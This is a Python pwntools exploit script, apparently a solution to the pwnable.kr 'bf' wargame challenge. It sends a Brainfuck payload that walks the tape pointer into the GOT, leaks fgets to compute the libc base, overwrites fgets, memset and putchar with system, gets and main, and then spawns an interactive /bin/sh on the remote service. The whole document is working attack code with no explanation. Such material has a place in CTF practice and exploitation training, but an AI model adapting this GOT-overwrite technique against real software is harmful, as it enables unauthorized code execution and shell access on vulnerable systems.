from pwn import *
context.log_level='debug'

tape_addr = 0x0804A0A0
fgets_addr = 0x0804A010
memset_addr = 0x0804A02C
putchar_addr = 0x0804A030
 
def send_brainfuck():
 
        payload = "<" * (tape_addr - fgets_addr) # go to fgets
        payload += ".>" * 4 #print fgets address
        payload += "<" * 4 # go to fgets
        payload += ",>" * 4 #overwrite fgets system
        payload += "<" * 4 # go to fgets
 
        payload += ">" * (memset_addr - fgets_addr) # go to memset
        payload += ",>" * 4 #overwrite memset gets
        payload += "<" * 4
 
        payload += ">"* (putchar_addr - memset_addr)
        payload += ",>" * 4 # overwrite putchar main
        payload += "." # run putchar = main
        print("PAYLOAD : " + payload)
        return payload
 
def run():
        libc = ELF("./bf_libc.so")
        s = remote("pwnable.kr",9001)
 
        s.recvline_startswith("type")    
        s.sendline(send_brainfuck())
 
        recv_fgets_addr = s.recvn(4)[::-1].hex()    
        libc_base = int(recv_fgets_addr,16) - libc.symbols['fgets']
        send_system_addr =  libc.symbols['system'] + libc_base
        send_gets_addr =  libc.symbols['gets'] + libc_base

        s.send(p32(send_system_addr))
        s.send(p32(send_gets_addr))
        s.send(p32(0x08048671))
        s.sendline('/bin/sh\00')
        s.interactive()
 
 
run()
